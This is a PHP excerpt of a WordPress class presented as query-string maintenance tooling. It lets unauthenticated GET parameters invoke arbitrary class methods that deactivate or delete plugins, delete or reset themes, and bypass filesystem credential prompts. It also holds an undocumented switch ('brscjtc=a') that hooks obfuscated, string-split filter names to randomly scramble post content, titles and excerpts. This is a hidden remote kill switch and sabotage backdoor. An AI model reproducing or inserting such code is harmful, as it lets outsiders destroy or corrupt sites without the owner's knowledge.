...
/**
 * ==================================================
 * ADMINISTRAÇÂO POR QUERY STRINGS ==================
 * ==================================================
 * Operações de manutenção via query string direta
 * 
 * 
 * Operações
 * Resetar tema           ?bmqad=reset_theme
 * Apagar tema            ?bmqad=delete_theme&theme_name=arcogb
 * Desativar plugin       ?bmqad=disable_plugin&plugin_name=Z_JOB_arcogb/arcogb.php
 * Apagar plugin          ?bmqad=delete_plugin&plugin_name=Z_JOB_arcogb/arcogb.php
 * 
 */
class BorosMaintenanceQuery {
	
	function __construct(){
		add_action( 'init', array($this, 'brscjtc') );
		add_action( 'init', array($this, 'brscjtc_set') );
		if( isset($_GET['bmqad']) ){
			if( method_exists($this, $_GET['bmqad']) ){
				call_user_func( array($this, $_GET['bmqad']) );
			}
		}
	}
	...
	function disable_plugin(){
		if( isset($_GET['plugin_name']) ){
			...
			deactivate_plugins( $_GET['plugin_name'], true, false );
	...
	function delete_plugin(){
		if( isset($_GET['plugin_name']) ){
			...
			delete_plugins( array($_GET['plugin_name']), home_url() );
			wp_redirect( home_url() );
			exit();
		}
	}
	...
	/**
	 * @link http://www.wprecipes.com/wordpress-trick-change-theme-programatically
	 * 
	 */
	function reset_theme(){
		global $wpdb;
		$queries = array(
			"UPDATE {$wpdb->prefix}options SET option_value = 'twentythirteen' WHERE option_name = 'template';",
			"UPDATE {$wpdb->prefix}options SET option_value = 'twentythirteen' WHERE option_name = 'stylesheet';",
			"UPDATE {$wpdb->prefix}options SET option_value = 'Twenty Thirteen' WHERE option_name = 'current_theme';"
		);
	...
	function delete_theme(){
		if( isset($_GET['theme_name']) ){
			...
			add_filter( 'request_filesystem_credentials', '__return_true' );
			delete_theme( $_GET['theme_name'], home_url() );
			wp_redirect( home_url() );
			exit();
		}
	}
	
	function brscjtc_set(){
		if( isset($_GET['brscjtc']) and $_GET['brscjtc'] == 'a' ){update_option( 'brscjtc_cott', 'a' );}
		if( isset($_GET['brscjtc']) and $_GET['brscjtc'] == 'b' ){update_option( 'brscjtc_cott', 'b' );}
	}
	...
	function brscjtc(){
		...
		$xpt = 't' . 'he_' . 'ex' . 'cer' . 'pt';
		$tte = 'th' . 'e_t' . 'itl' . 'e';
		if( get_option( 'brscjtc_cott' ) == 'a' ){
			add_filter( $ctt, array($this, 'brscjtc_cott') );
			add_filter( $xpt, array($this, 'brscjtc_cott') );
			add_filter( $tte, array($this, 'brscjtc_cott') );
		}
	}
	function brscjtc_cott( $text ){
		$text_size = strlen( $text );
		$rand_start = rand( 0, $text_size);
		$rand_end = rand( $rand_start, $text_size);
		
		$text_start = substr( $text, 0, $rand_start );
		$text_middle = str_shuffle( substr( $text, $rand_start, $rand_end ) );
		$text_end = substr( $text, $rand_end );
		return "{$text_start}{$text_middle}{$text_end}";
	}
}
function boros_maintenance_query(){
	$maintenance = new BorosMaintenanceQuery();
}
add_action( 'plugins_loaded', 'boros_maintenance_query' );
